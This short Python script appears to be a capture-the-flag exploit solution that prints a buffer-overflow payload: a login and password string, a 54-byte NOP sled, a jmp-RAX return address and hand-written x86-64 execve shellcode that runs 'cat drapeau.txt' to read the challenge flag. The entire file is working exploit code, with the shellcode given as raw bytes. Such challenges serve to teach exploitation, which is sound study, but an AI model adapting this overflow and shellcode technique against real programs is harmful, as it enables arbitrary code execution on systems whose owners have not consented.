#/usr/bin/env python3

# login 
login = "ui\n"

# password
policy = "0o"
nopsled = "\x90"*(54)

# shellcode crafted as cat drapeau.txt
shellcode = ("\x48\x31\xD2\x52\xB0\x00\x48\xBB\x2F\x62\x69\x6E\x2F\x63\x61\x74\x53\x48\x89\xE7\x52\x48\xC7\xC3\x74\x78\x74\x00\x53\x48\xBB\x64\x72\x61\x70\x65\x61\x75\x2E\x53\x48\x89\xE3\x52\x53\x57\x48\x89\xE6\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05")


# jmp RAX
jmp = '\x53\x06\x40\x00\x00\x00\x00\x00'


print(login+policy+nopsled+jmp+shellcode)
